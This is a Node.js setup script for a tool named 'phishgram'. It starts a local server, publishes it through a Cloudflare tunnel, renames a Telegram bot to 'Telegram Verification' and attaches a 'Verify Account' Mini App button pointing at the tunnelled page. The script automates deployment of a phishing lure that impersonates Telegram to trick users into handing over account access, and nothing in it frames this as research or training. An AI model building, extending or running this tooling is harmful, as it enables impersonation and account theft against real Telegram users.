#!/usr/bin/env node

/**
 * Universal Setup Script for phishgram
 * Works on Windows, Linux, and macOS
 */

import { spawn, exec } from 'child_process';
import { promises as fs } from 'fs';
import * as path from 'path';
import * as readline from 'readline';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import * as http from 'http';
import * as https from 'https';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
const PROJECT_DIR = path.join(__dirname, '..');

// Colors for console output
const colors = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    cyan: '\x1b[36m'
};

function log(message, color = 'reset') {
    console.log(`${colors[color]}${message}${colors.reset}`);
}

function prompt(question) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    
    return new Promise(resolve => {
        rl.question(question, answer => {
            rl.close();
            resolve(answer.trim());
        });
    });
}

async function checkCommand(command) {
    return new Promise(resolve => {
        exec(`${process.platform === 'win32' ? 'where' : 'which'} ${command}`, (error) => {
            resolve(!error);
        });
    });
}

async function execCommand(command, options = {}) {
    return new Promise((resolve, reject) => {
        exec(command, { ...options, cwd: PROJECT_DIR }, (error, stdout, stderr) => {
            if (error) {
                reject({ error, stdout, stderr });
            } else {
                resolve({ stdout, stderr });
            }
        });
    });
}

async function spawnCommand(command, args = [], options = {}) {
    return new Promise((resolve, reject) => {
        const child = spawn(command, args, {
            ...options,
            cwd: PROJECT_DIR,
            shell: process.platform === 'win32',
            stdio: 'inherit'
        });

        child.on('error', reject);
        child.on('exit', (code) => {
            if (code === 0) {
                resolve();
            } else {
                reject(new Error(`Command failed with exit code ${code}`));
            }
        });
    });
}

async function makeRequest(url, options = {}) {
    return new Promise((resolve, reject) => {
        const urlObj = new URL(url);
        const module = urlObj.protocol === 'https:' ? https : http;
        
        const req = module.request(url, options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    resolve(JSON.parse(data));
                } catch (e) {
                    resolve(data);
                }
            });
        });
        
        req.on('error', reject);
        
        if (options.body) {
            req.write(options.body);
        }
        
        req.end();
    });
}

async function installDependencies() {
    log('📦 Checking dependencies...', 'blue');
    
    try {
        await fs.access(path.join(PROJECT_DIR, 'node_modules'));
        log('✅ Dependencies already installed', 'green');
    } catch {
        log('📦 Installing dependencies...', 'yellow');
        await spawnCommand('npm', ['install']);
        log('✅ Dependencies installed', 'green');
    }
}

async function startServer() {
    log('\n🚀 Starting server...', 'blue');
    
    const serverProcess = spawn('node', ['backend/server.js'], {
        cwd: PROJECT_DIR,
        detached: process.platform !== 'win32',
        stdio: ['ignore', 'pipe', 'pipe']
    });
    
    return new Promise((resolve) => {
        let serverStarted = false;
        
        serverProcess.stdout.on('data', (data) => {
            const output = data.toString();
            if (!serverStarted && output.includes('server running')) {
                serverStarted = true;
                log('✅ Server started on port 3000', 'green');
                resolve(serverProcess);
            }
            process.stdout.write(`${colors.cyan}[Server]${colors.reset} ${output}`);
        });
        
        serverProcess.stderr.on('data', (data) => {
            process.stderr.write(`${colors.red}[Server Error]${colors.reset} ${data}`);
        });
        
        // Fallback timeout
        setTimeout(() => {
            if (!serverStarted) {
                log('✅ Server process started', 'green');
                resolve(serverProcess);
            }
        }, 3000);
    });
}

async function startTunnel(port = 3000) {
    log('\n🌐 Starting Cloudflare tunnel...', 'blue');
    
    const hasCloudflared = await checkCommand('cloudflared');
    if (!hasCloudflared) {
        log('⚠️  cloudflared not found. Please install it manually:', 'yellow');
        log('   https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/', 'yellow');
        return null;
    }
    
    const tunnelProcess = spawn('cloudflared', ['tunnel', '--url', `http://localhost:${port}`], {
        cwd: PROJECT_DIR,
        detached: process.platform !== 'win32',
        stdio: ['ignore', 'pipe', 'pipe']
    });
    
    return new Promise((resolve) => {
        let tunnelUrl = null;
        
        const checkOutput = (data) => {
            const output = data.toString();
            const match = output.match(/https:\/\/[a-zA-Z0-9-]+\.trycloudflare\.com/);
            if (match) {
                tunnelUrl = match[0];
                log(`✅ Tunnel URL: ${tunnelUrl}`, 'green');
                resolve({ process: tunnelProcess, url: tunnelUrl });
            }
        };
        
        tunnelProcess.stdout.on('data', checkOutput);
        tunnelProcess.stderr.on('data', checkOutput);
        
        // Timeout
        setTimeout(() => {
            if (!tunnelUrl) {
                log('⚠️  Could not get tunnel URL', 'yellow');
                resolve({ process: tunnelProcess, url: null });
            }
        }, 30000);
    });
}

async function setupBotMenuButton(botToken, url) {
    log('\n📱 Setting up Mini App menu button...', 'blue');
    
    const apiUrl = `https://api.telegram.org/bot${botToken}`;
    
    try {
        // Set menu button for Mini App
        const result = await makeRequest(`${apiUrl}/setChatMenuButton`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                menu_button: {
                    type: 'web_app',
                    text: 'Verify Account',
                    web_app: {
                        url: url
                    }
                }
            })
        });
        
        if (result.ok) {
            log('✅ Menu button "Verify Account" configured', 'green');
            return true;
        } else {
            log(`⚠️  Could not set menu button: ${result.description}`, 'yellow');
            return false;
        }
    } catch (error) {
        log(`⚠️  Menu button setup failed: ${error.message}`, 'yellow');
        return false;
    }
}

async function setupBot(botToken, appUrl) {
    log('\n🤖 Setting up Telegram bot...', 'blue');
    
    const apiUrl = `https://api.telegram.org/bot${botToken}`;
    
    try {
        // Test bot
        const botInfo = await makeRequest(`${apiUrl}/getMe`);
        if (!botInfo.ok) {
            throw new Error(botInfo.description || 'Invalid bot token');
        }
        
        const botUsername = botInfo.result.username;
        log(`✅ Bot found: @${botUsername}`, 'green');
        
        // Set bot name
        await makeRequest(`${apiUrl}/setMyName`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ name: 'Telegram Verification' })
        });
        log('✅ Bot name set', 'green');
        
        // Setup menu button
        await setupBotMenuButton(botToken, appUrl);

        // Manual Mini App setup required
        log('📱 To enable Mini App:', 'cyan');
        log('   1. Go to @BotFather', 'cyan');
        log('   2. Select your bot -> Bot Settings -> Configure Mini App', 'cyan');
        log('   3. Enable Mini App', 'cyan');
        log(`   4. Set URL to: ${appUrl}`, 'cyan');

        
        return {
            success: true,
            username: botUsername,
            url: appUrl
        };
        
    } catch (error) {
        log(`❌ Bot setup failed: ${error.message}`, 'red');
        return { success: false, error: error.message };
    }
}

async function main() {
    log('🚀 phishgram setup', 'bright');
    log('===========================\n', 'bright');
    
    const args = process.argv.slice(2);
    const mode = args[0] || 'full';
    
    let processes = [];
    
    try {
        // Install dependencies
        await installDependencies();
        
        if (mode === 'bot-only') {
            // Bot setup only
            const botToken = process.env.BOT_TOKEN || await prompt('🔑 Enter bot token: ');
            const appUrl = process.env.APP_URL || await prompt('🌐 Enter app URL: ');
            
            const result = await setupBot(botToken, appUrl);
            if (result.success) {
                log(`\n🎉 Bot setup complete!`, 'green');
                log(`Bot: https://t.me/${result.username}`, 'blue');
            }
            return;
        }
        
        // Start server
        const serverProcess = await startServer();
        if (serverProcess) processes.push(serverProcess);
        
        // Start tunnel if not local-only
        const port = process.env.PORT || 3000;
        let appUrl = `http://localhost:${port}`;
        if (mode !== 'local') {
            const tunnel = await startTunnel(port);
            if (tunnel) {
                if (tunnel.process) processes.push(tunnel.process);
                if (tunnel.url) appUrl = tunnel.url;
            }
        }
        
        // Setup bot if requested
        if (mode === 'full' && process.env.BOT_TOKEN) {
            const result = await setupBot(process.env.BOT_TOKEN, appUrl);
            if (result.success) {
                log(`\n🎉 Complete setup finished!`, 'green');
                log(`Local URL: http://localhost:3000`, 'blue');
                log(`Public URL: ${appUrl}`, 'blue');
                log(`Bot: https://t.me/${result.username}`, 'blue');
            }
        } else if (mode === 'full') {
            log('\n💡 To setup bot, run:', 'yellow');
            log(`   BOT_TOKEN=your_token APP_URL=${appUrl} npm run setup bot-only`, 'yellow');
        }
        
        log('\n📊 Services running. Press Ctrl+C to stop.', 'cyan');
        
        // Handle shutdown
        process.on('SIGINT', () => {
            log('\n🧹 Shutting down...', 'yellow');
            processes.forEach(p => {
                try {
                    if (process.platform === 'win32') {
                        exec(`taskkill /pid ${p.pid} /f`);
                    } else {
                        p.kill('SIGTERM');
                    }
                } catch (e) {
                    // Ignore errors
                }
            });
            process.exit(0);
        });
        
        // Keep running
        await new Promise(() => {});
        
    } catch (error) {
        log(`\n❌ Error: ${error.message}`, 'red');
        process.exit(1);
    }
}

// Show help
if (process.argv.includes('--help') || process.argv.includes('-h')) {
    log('phishgram Setup Script\n', 'bright');
    log('Usage: npm run setup [mode]\n');
    log('Modes:');
    log('  full      - Start server, tunnel, and setup bot (default)');
    log('  local     - Start server only (no tunnel)');
    log('  bot-only  - Setup bot only (no server)');
    log('\nEnvironment variables:');
    log('  BOT_TOKEN - Telegram bot token');
    log('  APP_URL   - Application URL for bot setup');
    log('\nExamples:');
    log('  npm run setup');
    log('  npm run setup local');
    log('  BOT_TOKEN=xxx npm run setup full');
    log('  npm run setup bot-only');
    process.exit(0);
}

main().catch(console.error);